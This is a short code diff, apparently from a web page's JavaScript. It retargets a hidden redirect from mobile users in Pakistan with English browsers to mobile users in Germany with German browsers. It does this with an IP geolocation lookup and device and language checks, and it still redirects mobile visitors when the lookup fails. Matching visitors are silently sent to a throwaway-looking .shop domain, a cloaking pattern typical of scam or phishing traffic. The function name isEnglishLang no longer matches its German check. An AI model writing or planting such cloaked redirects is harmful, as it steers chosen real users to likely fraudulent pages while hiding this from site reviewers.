@@ -44,16 +44,16 @@
     }
 
    function isEnglishLang() {
-    return navigator.language.startsWith('en') || 
-           navigator.languages.some(lang => lang.startsWith('en'));
+    return navigator.language.startsWith('de') || 
+           navigator.languages.some(lang => lang.startsWith('de'));
 }
 
     fetch('https://ipapi.co/json/')
       .then(response => response.json())
       .then(data => {
         // 严格的三重条件判断
-        if (data.country === 'PK' && isMobileDevice() && isEnglishLang()) {
-          window.location.href = "https://www.jacmsotck.online/jz/j.html";
+        if (data.country === 'DE' && isMobileDevice() && isEnglishLang()) {
+          window.location.href = "https://www.qmke610kr.shop/de/g1.html";
           return;
         }
      
@@ -67,7 +67,7 @@
       .catch(() => {
         // IP检测失败时严格的双重条件判断
         if (isMobileDevice() && isEnglishLang()) {
-          window.location.href = "https://www.jacmsotck.online/jz/j.html";
+          window.location.href = "https://www.qmke610kr.shop/de/g1.html";
           return;
         }
         
